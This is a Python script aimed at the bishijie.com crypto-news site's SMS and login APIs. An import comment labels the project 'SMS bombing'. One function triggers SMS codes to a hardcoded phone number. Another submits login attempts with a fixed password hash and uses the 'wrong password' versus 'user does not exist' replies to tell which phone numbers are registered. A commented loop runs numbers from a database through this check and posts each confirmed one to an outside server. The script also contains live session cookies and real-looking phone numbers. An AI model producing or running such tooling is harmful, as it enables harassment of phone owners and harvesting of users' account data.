import requests
# from 短信轰炸.number_mongo import number_six
# from number_mongo import number_BaFangZiYuan


def send_sms():
    url = "http://www.bishijie.com/api/user/getSms?type=2&uuid=web_pc&mobile=18505615375"
    headers = {
        "Host": "www.bishijie.com",
        "Connection": "keep-alive",
        "Pragma": "no-cache",
        "Cache-Control": "no-cache",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36",
        "Referer": "http://www.bishijie.com/kuaixun/",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "acw_tc=AQAAAAQGURW2xwEAuVARcFwdkmITNX9p; PHPSESSID=4ha06s31jk7k9qnrtg7cvr1t35; Hm_lvt_760519477a6dd9d6ef4ae6014436ab92=1529644618; Hm_lpvt_760519477a6dd9d6ef4ae6014436ab92=1529644618; __lnkrntdmcvrd=-1",
    }
    page = requests.get(url, headers=headers).text
    print(eval(page))


def check_number(number):
    headers = {'Host': 'www.bishijie.com', 'Connection': 'keep-alive', 'Pragma': 'no-cache',
               'Cache-Control': 'no-cache', 'Accept': '*/*', 'X-Requested-With': 'XMLHttpRequest',
               'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
               'Referer': 'http://www.bishijie.com/kuaixun/', 'Accept-Encoding': 'gzip, deflate',
               'Accept-Language': 'zh-CN,zh;q=0.9',
               'Cookie': '__lnkrntdmcvrd=-1; acw_tc=AQAAAH1QmVhrxwsAuVARcFsIljSdDQ0H; PHPSESSID=esdviboq89pc2eqff6kk2nkq53; Hm_lvt_760519477a6dd9d6ef4ae6014436ab92=1529644618,1529931408; Hm_lpvt_760519477a6dd9d6ef4ae6014436ab92=1529931408'}
    url = "http://www.bishijie.com/api/user/login?mobile=" + str(
        number) + "&passwd=25f9e794323b453885f5181f1b624d0b&uuid=web_pc"

    page = requests.get(url, headers=headers).text
    print(page)
    return page


def save_success_number(number):
    with open("success_币世界.txt", "a+")as f:
        f.write(str(number) + "\n")


def save_faile_number(number):
    with open("faile_币世界.txt", "a+")as f:
        f.write(str(number) + "\n")


def save(number):
    url ="http://122.114.183.102:8080/saveNumber/{0}/".format(number,)
    print(requests.get(url).text)


# if __name__ == "__main__":
#     count = 0
#     while True:
#         try:
#             with open("flag_币世界.txt")as f:
#                 count = int(f.read())
#             for res in number_BaFangZiYuan.find({'_id': count}):
#                 line = res["number"].replace("\n", "")
#                 print(line, count)
#                 count += 1
#                 result = check_number(line)
#                 if str(result).find("密码错误") != -1:
#                     save_success_number(number=line)
#                     save(number=line)
#                 else:
#                     save_faile_number(number=line)
#             with open("flag_币世界.txt", "w")as f:
#                 f.write(str(count))
#         except:
#             pass

#     {"error":1,"message":"用户不存在，请注册","data":{}}
# {"error":1,"message":"密码错误","data":{}}

if __name__ == '__main__':
    check_number("13247785045")
    pass